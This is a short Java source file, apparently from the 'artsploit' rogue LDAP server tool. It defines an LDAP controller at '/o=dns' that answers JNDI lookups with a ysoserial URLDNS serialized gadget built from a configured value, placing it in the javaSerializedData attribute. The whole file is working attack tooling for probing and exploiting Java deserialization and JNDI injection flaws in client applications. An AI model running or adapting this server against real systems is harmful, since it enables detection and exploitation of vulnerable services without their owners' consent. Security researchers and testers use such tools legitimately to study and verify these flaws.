package artsploit.controllers;

import artsploit.Config;
import artsploit.annotations.LdapMapping;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import ysoserial.payloads.URLDNS;
import java.lang.reflect.Method;

import static artsploit.Utilities.serialize;

@LdapMapping(uri = { "/o=dns" })
public class Dns implements LdapController {

    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {

        System.out.println("Sending LDAP ResourceRef result for " + base);

        Entry e = new Entry(base);
        e.addAttribute("javaClassName", "java.lang.String"); //could be any

        Method m = URLDNS.class.getMethod("getObject", String.class);
        URLDNS myObj = new URLDNS();
        Object obj  = (Object) m.invoke(myObj, Config.command);

        e.addAttribute("javaSerializedData", serialize(obj));

        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }
}
